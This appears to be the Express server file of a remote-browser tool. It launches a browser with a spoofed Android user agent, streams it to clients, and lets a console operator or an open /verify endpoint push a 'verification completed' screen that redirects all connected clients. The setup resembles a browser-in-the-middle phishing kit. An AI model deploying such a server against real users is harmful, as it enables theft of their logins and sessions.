const express = require('express');
const http = require('http');
const path = require('path');
const { launcher } = require('../zombie-lord');
const wsServer = require('./ws-server');
const sessionManager = require('./session-manager');

const app = express();
const server = http.createServer(app);

// Disable caching so clients always get the newest index.html
app.use((req, res, next) => {
  res.set('Cache-Control', 'no-store');
  next();
});

app.use(express.static(path.join(__dirname, '..', '..', 'public')));
app.use(express.json());

// Alternative HTTP trigger for the verification screen
app.get('/verify', (req, res) => {
  console.log('Verification triggered via HTTP endpoint. Sending screen to clients...');
  for (const ws of sessionManager.clients.keys()) {
    if (ws.readyState === 1) { // 1 = OPEN
      ws.send(JSON.stringify({ type: 'verification_done' }));
    }
  }
  res.send('<h1>Success!</h1><p>The verification screen has been sent to the connected mobile client.</p>');
});

wsServer.init(server);

// Pre-boot the browser engine so it's instantly ready when a client connects
sessionManager.currentSpecs = { 
  w: 390, 
  h: 844, 
  dpr: 2.0, 
  ua: 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36' 
};

launcher.startNativeBrowser(
  sessionManager.currentSpecs.w, 
  sessionManager.currentSpecs.h, 
  sessionManager.currentSpecs.dpr, 
  sessionManager.currentSpecs.ua, 
  () => {
    wsServer.isCapturing = false;
    if (sessionManager.clients.size > 0) wsServer.ensureCapture();
  }
);

const readline = require('readline');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

console.log('\n--- Controls ---');
console.log('Type "1" and press Enter to complete verification and redirect clients.');
console.log('----------------\n');

rl.on('line', (input) => {
  if (input.trim() === '1') {
    console.log('Sent verification completion screen to client. They will be redirected in 4 seconds.');
    for (const ws of sessionManager.clients.keys()) {
      if (ws.readyState === 1) { // 1 = OPEN
        ws.send(JSON.stringify({ type: 'verification_done' }));
      }
    }
  }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Remote browser server listening on http://0.0.0.0:${PORT}`);
});

process.on('SIGINT', async () => {
  wsServer.shutdown();
  await launcher.close();
  process.exit(0);
});
